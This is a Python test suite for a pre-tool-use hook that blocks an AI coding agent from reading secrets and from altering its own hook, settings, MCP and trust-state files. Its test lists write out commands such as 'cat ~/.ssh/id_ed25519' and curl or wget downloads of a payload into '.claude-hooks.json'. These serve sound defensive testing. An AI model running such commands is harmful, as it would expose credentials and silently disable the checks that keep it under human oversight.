import json
import subprocess
import sys
from pathlib import Path

import pytest
from helpers import isolated_home_env, load_hook

secrets_guard = load_hook("pre_tool_use/secrets_guard.py")

CFG = {"enabled": True, "protected_paths": [], "allow_paths": []}


def _event(tool, cwd=None, **tool_input):
    ev = {"tool_name": tool, "tool_input": tool_input}
    if cwd is not None:
        ev["cwd"] = cwd
    return ev


DENY_EVENTS = [
    _event("Read", file_path="/proj/.env"),
    _event("Edit", file_path="/proj/.env.production"),
    _event("Write", file_path="/proj/server.pem"),
    _event("Read", file_path="~/.ssh/id_rsa"),
    _event("Read", file_path="~/.aws/credentials"),
    _event("Bash", command="cat .env"),
    _event("Bash", command="less ~/.ssh/id_ed25519"),
]

ALLOW_EVENTS = [
    _event("Read", file_path="/proj/.env.example"),
    _event("Read", file_path="/proj/.env.sample"),
    _event("Read", file_path="~/.ssh/id_rsa.pub"),
    _event("Read", file_path="/proj/src/app.py"),
    _event("Bash", command="cat .env.example"),
    _event("Bash", command="git status"),
]


@pytest.mark.parametrize("event", DENY_EVENTS)
def test_denied(event):
    v = secrets_guard.evaluate(event, CFG)
    assert v is not None and v["decision"] == "deny", event


@pytest.mark.parametrize("event", ALLOW_EVENTS)
def test_allowed(event):
    assert secrets_guard.evaluate(event, CFG) is None, event


def test_config_protected_paths_extend():
    cfg = dict(CFG, protected_paths=["config/secrets/*"])
    v = secrets_guard.evaluate(_event("Read", file_path="config/secrets/db.yaml"), cfg)
    assert v["decision"] == "deny"


def test_config_allow_paths_extend():
    cfg = dict(CFG, allow_paths=[".env.template"])
    assert secrets_guard.evaluate(_event("Read", file_path="/proj/.env.template"), cfg) is None


def test_bash_non_path_tokens_ignored():
    assert secrets_guard.evaluate(_event("Bash", command="grep -rn credentials src/"), CFG) is None
    assert secrets_guard.evaluate(_event("Bash", command='find . -name "*.pem"'), CFG) is None


def test_bash_path_like_tokens_still_denied():
    v1 = secrets_guard.evaluate(_event("Bash", command="cat secrets.yaml"), CFG)
    assert v1["decision"] == "deny"
    v2 = secrets_guard.evaluate(_event("Bash", command="cp .env.example .env"), CFG)
    assert v2["decision"] == "deny"


def test_write_protected_edit_denied():
    for path in [".claude-hooks.json", "/proj/.claude/settings.json",
                 "/proj/.claude/settings.local.json"]:
        v = secrets_guard.evaluate(_event("Write", file_path=path), CFG)
        assert v is not None and v["decision"] == "deny", path
        v2 = secrets_guard.evaluate(_event("Edit", file_path=path), CFG)
        assert v2 is not None and v2["decision"] == "deny", path


def test_write_protected_read_allowed():
    assert secrets_guard.evaluate(_event("Read", file_path=".claude-hooks.json"), CFG) is None
    assert secrets_guard.evaluate(_event("Bash", command="cat .claude-hooks.json"), CFG) is None


def test_write_protected_bash_mutation_denied():
    for cmd in ["echo x > .claude-hooks.json", "rm .claude-hooks.json",
                "sed -i s/a/b/ .claude/settings.json"]:
        v = secrets_guard.evaluate(_event("Bash", command=cmd), CFG)
        assert v is not None and v["decision"] == "deny", cmd


def test_write_protected_does_not_block_unrelated_settings():
    for path in ["/app/.vscode/settings.json", "/app/webhooks/hooks.json"]:
        assert secrets_guard.evaluate(_event("Write", file_path=path), CFG) is None, path


def test_write_protected_read_with_redirect_allowed():
    # 保護ファイルの「読取」はリダイレクトを伴っても通す(2>/dev/null 等)
    for cmd in ["cat .claude-hooks.json 2>/dev/null",
                "cat .claude-hooks.json > /tmp/out.json",
                "grep foo .claude-hooks.json 2>&1"]:
        assert secrets_guard.evaluate(_event("Bash", command=cmd), CFG) is None, cmd


def test_write_protected_config_extends():
    cfg = dict(CFG, write_protected_paths=["deploy.lock"])
    v = secrets_guard.evaluate(_event("Write", file_path="deploy.lock"), cfg)
    assert v["decision"] == "deny"


def test_write_protected_glued_redirect_and_dd_denied():
    for cmd in ["echo x >.claude-hooks.json",
                "echo x>>.claude-hooks.json",
                "dd if=/dev/zero of=.claude-hooks.json"]:
        v = secrets_guard.evaluate(_event("Bash", command=cmd), CFG)
        assert v is not None and v["decision"] == "deny", cmd


def test_write_protected_mcp_and_claude_json_denied():
    # MCPサーバ定義・グローバル設定は任意コマンド実行経路になるため書込保護(0.5.0)
    for path in [".mcp.json", "/proj/.mcp.json", "/home/alice/.claude.json"]:
        v = secrets_guard.evaluate(_event("Write", file_path=path), CFG)
        assert v is not None and v["decision"] == "deny", path
    assert secrets_guard.evaluate(_event("Read", file_path=".mcp.json"), CFG) is None
    assert secrets_guard.evaluate(_event("Bash", command="cat .mcp.json"), CFG) is None


def test_download_output_to_protected_denied():
    for cmd in [
        "curl -o .claude-hooks.json https://example.com/payload",
        "curl -fsSLo .mcp.json https://example.com/payload",
        "curl -o.claude-hooks.json https://example.com/payload",
        "curl --output .claude/settings.json https://example.com/payload",
        "wget -O .claude/settings.json https://example.com/payload",
        "wget --output-document=.mcp.json https://example.com/payload",
        "git pull && curl -o .claude-hooks.json https://example.com/payload",
        "wget -o .claude-hooks.json https://example.com/payload",
        "wget --output-file=.claude/settings.json https://example.com/payload",
        "wget -a .mcp.json https://example.com/payload",
        "curl https://x.example | wget -O .claude-hooks.json -",
    ]:
        v = secrets_guard.evaluate(_event("Bash", command=cmd), CFG)
        assert v is not None and v["decision"] == "deny", cmd


def test_download_read_and_unprotected_output_allowed():
    for cmd in [
        "curl https://example.com/repo/.claude/settings.json",
        "curl -o /tmp/page.html https://example.com/",
        "curl --output result.json https://example.com/api",
        "curl -O https://example.com/file.tar.gz",
        "wget -O - https://example.com/notes.txt",
        "wget https://example.com/file.tar.gz",
        "wget -o /tmp/wget.log https://example.com/file.tar.gz",
        "wget --append-output=/tmp/wget.log https://example.com/file.tar.gz",
    ]:
        assert secrets_guard.evaluate(_event("Bash", command=cmd), CFG) is None, cmd


def test_deny_survives_enabled_false_blackbox(tmp_path):
    (tmp_path / ".claude-hooks.json").write_text(
        '{"secrets_guard": {"enabled": false}}', encoding="utf-8"
    )
    script = (Path(__file__).resolve().parent.parent
              / "hooks" / "pre_tool_use" / "secrets_guard.py")
    event = {"tool_name": "Read", "cwd": str(tmp_path),
             "tool_input": {"file_path": "/proj/.env"}}
    env = isolated_home_env(tmp_path / "home", approve=tmp_path)
    r = subprocess.run([sys.executable, str(script)], input=json.dumps(event),
                       capture_output=True, text=True, timeout=30, env=env)
    assert r.returncode == 0
    out = json.loads(r.stdout)
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "systemMessage" in out


# ---- 書込保護の照合は「表記」でなく「イベントの cwd 基準で正規化したパス」に対して行う ----
# 同じファイルでも経路(Edit/Write の絶対 file_path、Bash の相対トークン)で表記が違う。
# パススコープ付きパターン(`*/.loop/state.json`)が全表記を飲み込むことを表記ごとに確認する。

PROJ = "/home/alice/proj"
LOOP_CFG = dict(CFG, write_protected_paths=["*/.loop/state.json"])


@pytest.mark.parametrize("cmd", [
    "echo x > .loop/state.json",                    # 相対(従来は素通り)
    "echo x > ./.loop/state.json",                  # ./ 付き
    "echo x > /home/alice/proj/.loop/state.json",   # 絶対
    "echo x > ../proj/.loop/state.json",            # ../ 経由で同じ場所
    "tee .loop/state.json",                         # 変異子経由
    "cp x .loop/state.json",
    "sed -i s/a/b/ .loop/state.json",
])
def test_write_protected_bash_token_normalized_against_event_cwd(cmd):
    v = secrets_guard.evaluate(_event("Bash", command=cmd, cwd=PROJ), LOOP_CFG)
    assert v is not None and v["decision"] == "deny", cmd
    assert "*/.loop/state.json" in v["reason"], cmd


def test_write_protected_bash_tilde_is_expanded(monkeypatch):
    monkeypatch.setenv("HOME", "/home/alice")
    v = secrets_guard.evaluate(
        _event("Bash", command="echo x > ~/proj/.loop/state.json", cwd=PROJ), LOOP_CFG)
    assert v is not None and v["decision"] == "deny"
    assert "*/.loop/state.json" in v["reason"]


@pytest.mark.parametrize("tool", ["Write", "Edit"])
def test_write_protected_file_tool_relative_path_normalized(tool):
    v = secrets_guard.evaluate(_event(tool, file_path=".loop/state.json", cwd=PROJ), LOOP_CFG)
    assert v is not None and v["decision"] == "deny", tool
    assert "*/.loop/state.json" in v["reason"]


@pytest.mark.parametrize("cmd", [
    "cat .loop/state.json",                 # 読取は止めない
    "cat .loop/state.json 2>/dev/null",
    "echo x > .loop/state.json.bak",        # 似て非なるパスは通る
    "echo x > loop/state.json",
    "echo x > ./notes/.loop-state.json.bak",
])
def test_write_protected_normalization_does_not_overreach(cmd):
    assert secrets_guard.evaluate(_event("Bash", command=cmd, cwd=PROJ), LOOP_CFG) is None, cmd


def test_write_protected_without_event_cwd_falls_back_to_process_cwd(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    v = secrets_guard.evaluate(_event("Bash", command="echo x > .loop/state.json"), LOOP_CFG)
    assert v is not None and v["decision"] == "deny"
    assert "*/.loop/state.json" in v["reason"]


def test_builtin_claude_settings_all_notations_covered_by_path_scoped_pattern(monkeypatch):
    # 重複エントリ(相対表記 ".claude/settings.json")削除の根拠:
    # パススコープ付き "*/.claude/settings.json" だけで相対 / ./ / 絶対 / ../ の全表記を飲み込む
    monkeypatch.setattr(
        secrets_guard.patterns, "load_rules",
        lambda name: {"protected": [], "allow": [], "protected_dirs": [],
                      "write_protected": ["*/.claude/settings.json"]},
    )
    for cmd in ["echo x > .claude/settings.json",
                "echo x > ./.claude/settings.json",
                "echo x > /home/alice/proj/.claude/settings.json",
                "echo x > ../proj/.claude/settings.json"]:
        v = secrets_guard.evaluate(_event("Bash", command=cmd, cwd=PROJ), CFG)
        assert v is not None and v["decision"] == "deny", cmd
        assert "*/.claude/settings.json" in v["reason"], cmd


# 絶対パスのパターン(ワイルドカード無し)は、`./`・`../` の畳み込みとイベント cwd の使用を
# 厳密に要求する(`*` パターンは `/` をまたぐため、正規化が無くても当たってしまい区別できない)
ABS_CFG = dict(CFG, write_protected_paths=["/home/alice/proj/.loop/state.json"])


@pytest.mark.parametrize("cmd", [
    "echo x > .loop/state.json",                           # 相対 → cwd で絶対化
    "echo x > ./.loop/state.json",                         # ./ を畳む
    "echo x > ../proj/.loop/state.json",                   # ../ を畳む
    "echo x > /home/alice/other/../proj/.loop/state.json", # 絶対でも ../ を畳む
])
def test_write_protected_absolute_pattern_matches_after_normalization(cmd):
    v = secrets_guard.evaluate(_event("Bash", command=cmd, cwd=PROJ), ABS_CFG)
    assert v is not None and v["decision"] == "deny", cmd
    assert "/home/alice/proj/.loop/state.json" in v["reason"], cmd


def test_write_protected_uses_event_cwd_not_process_cwd():
    # 同じ相対トークンでも、別プロジェクトの cwd から見れば保護対象のファイルではない
    v = secrets_guard.evaluate(
        _event("Bash", command="echo x > .loop/state.json", cwd="/home/alice/other"), ABS_CFG)
    assert v is None


# ---- 信頼状態ファイル($HOME/.claude/safe-dev-hooks-state.json)の書込保護(0.7.0) ----
# unpinned_seen はピン留めなし承認での内容変化を1度だけ通知するための唯一の記録で、
# 先回りして書き換えられると「変わった」通知が黙る。notice_last も未承認リマインダを
# 黙らせられる。パススコープ付き(`*/.claude/…`)で、無関係な同名ファイルは巻き込まない。

_STATE = "/home/alice/.claude/safe-dev-hooks-state.json"


def test_write_protected_trust_state_file_denied():
    for path in [_STATE, "/home/alice/.claude/safe-dev-hooks-state.json"]:
        for tool in ("Write", "Edit"):
            v = secrets_guard.evaluate(_event(tool, file_path=path), CFG)
            assert v is not None and v["decision"] == "deny", (tool, path)


def test_write_protected_trust_state_bash_mutation_denied():
    for cmd in [f"echo x > {_STATE}", f"echo x>>{_STATE}", f"rm {_STATE}",
                f"sed -i s/a/b/ {_STATE}", f"tee {_STATE}", f"cp evil.json {_STATE}"]:
        v = secrets_guard.evaluate(_event("Bash", command=cmd), CFG)
        assert v is not None and v["decision"] == "deny", cmd


def test_write_protected_trust_state_read_allowed():
    assert secrets_guard.evaluate(_event("Read", file_path=_STATE), CFG) is None
    assert secrets_guard.evaluate(_event("Bash", command=f"cat {_STATE}"), CFG) is None
    assert secrets_guard.evaluate(
        _event("Bash", command=f"cat {_STATE} 2>/dev/null"), CFG) is None


def test_write_protected_trust_state_does_not_overreach():
    # `.claude/` 配下でない同名ファイル・別名は保護対象外(裸 basename にしない)
    for path in ["/app/safe-dev-hooks-state.json",
                 "/home/alice/.claude/safe-dev-hooks-state.json.bak",
                 "/home/alice/.claude/other-state.json"]:
        assert secrets_guard.evaluate(_event("Write", file_path=path), CFG) is None, path
